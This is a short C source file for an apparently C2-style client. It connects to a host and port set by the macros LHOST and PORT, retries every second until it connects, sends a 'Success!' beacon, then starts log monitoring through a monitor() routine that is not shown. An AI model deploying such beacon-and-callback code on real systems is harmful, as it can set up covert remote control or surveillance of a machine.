#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>

#include "monitor.h"

int main(int argc, char* argv[]) {
    if (argc == 1) {
        printf("Invalid usage - please provide the path to the logging location configuration files\n");
        return -1;
    }

    char beacon[] = "Success!";
    char HOST[] = LHOST;
    int sockfd = 0, n = 0;
    char recvBuff[1024];
    struct sockaddr_in serv_addr;

    memset(recvBuff, '0' ,sizeof(recvBuff));
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Error : Could not create socket \n");
        return 1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    serv_addr.sin_addr.s_addr = inet_addr(HOST);
    printf("[+] Attempting to connect to remote server at %s:%d...", HOST, PORT);
    fflush(stdout);

    while (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        sleep(1);
    }
    send(sockfd, beacon, strlen(beacon), 0);
    printf("Done!\n[+] Connected to server!\n");

    printf("[+] Setting up log monitoring...\n");
    monitor(argv[1]);

    // while ((n = read(sockfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
    //     recvBuff[n] = 0;
    //     if(fputs(recvBuff, stdout) == EOF) {
    //         printf("\n Error : Fputs error");
    //     }
    //     printf("\n");
    // }

    if (n < 0) {
        printf("\n Error reading from socket! Was the connection closed? \n");
        return -1;
    }

    printf("Connection closed. Exiting...\n");
    return 0;
}